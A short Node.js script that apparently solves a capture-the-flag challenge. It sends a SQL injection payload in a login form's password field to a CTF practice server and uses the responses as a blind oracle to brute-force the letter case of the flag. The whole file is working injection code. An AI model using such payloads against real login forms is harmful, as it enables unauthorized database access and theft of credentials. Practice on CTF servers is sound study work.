const fetch = require('isomorphic-fetch');
const FormData = require('form-data');

function f(fd) {
  return fetch(
    "http://ctfq.sweetduet.info:10080/~q6/",
    {method: "POST", body: fd}
  ).then((res) => res.text());
}

function createFD(pass) {
  let fd = new FormData();
  fd.append('id', 'admin');
  fd.append('pass', "' or pass like '" + pass + "%' escape '!");
  return fd;
}

function tryAns(ans) {
  return new Promise((resolve, reject) => {
    f(createFD(ans))
    .then((body) => {
      resolve(body.includes("php"));
    })
  });
}

const prefix = 'FLAG!_';
const lowerAns = 'kpwa4ji3uzk6trpk';

new Promise((resolve, reject) => {
  // [...Array(n).keys()] -> [0, 1, 2, ..., n]
  [...Array(Math.pow(2, lowerAns.length)).keys()].map((i) => {
    let cand = lowerAns.split('').map((c, j) => {
      if(Math.pow(2, j) & i) return c.toUpperCase();
      return c;
    }).join('')
    console.log(cand);
    return cand;
  }).forEach((cand) => {
    console.log("TRY: " + cand);
    tryAns(prefix + cand)
    .then((res) => {
      if(!res) {
        console.log("NO: " + prefix + cand);
        return
      }
      console.log("YES: " + prefix + cand);
      resolve(prefix + cand);
    });
  })
}).then((ans) => {
  console.log(ans);
});
